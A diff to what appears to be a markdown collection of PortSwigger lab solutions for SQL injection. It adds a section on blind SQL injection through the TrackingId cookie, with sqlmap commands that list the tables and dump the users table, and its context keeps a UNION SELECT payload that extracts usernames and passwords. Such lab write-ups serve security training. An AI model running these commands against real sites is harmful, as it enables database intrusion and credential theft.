@@ -12,6 +12,7 @@
 - [SQL injection attack, querying the database type and version on MySQL and Microsoft](#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
 - [SQL injection attack, listing the database contents on non-Oracle databases](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
 - [SQL injection attack, listing the database contents on Oracle](#sql-injection-attack-listing-the-database-contents-on-oracle)
+- [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)
 
 ## SQL injection UNION attack, determining the number of columns returned by the query
 Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
@@ -216,3 +217,20 @@ docker run -it --rm secsi/sqlmap -u "<target_url>" -T <users_table_name> --dump
 '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
 ```
 8. Find the password for the ``administrator`` user, and use it to log in.
+
+## Blind SQL injection with conditional responses
+Reference: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+<!-- omit in toc -->
+### Quick Solution
+This time the SQL Injections resides in the ``TrackingId`` cookie. For this reason a different ``sqlmap`` command must be used:
+```
+# Detect tables
+docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --tables
+# Dump the content of 'users' table (set DBMS to speed up the execution)
+docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dbms=postgresql --dump
+```
+
+<!-- omit in toc -->
+### Solution
+The solution is **extremely long** and it has not been copied, see the reference link.
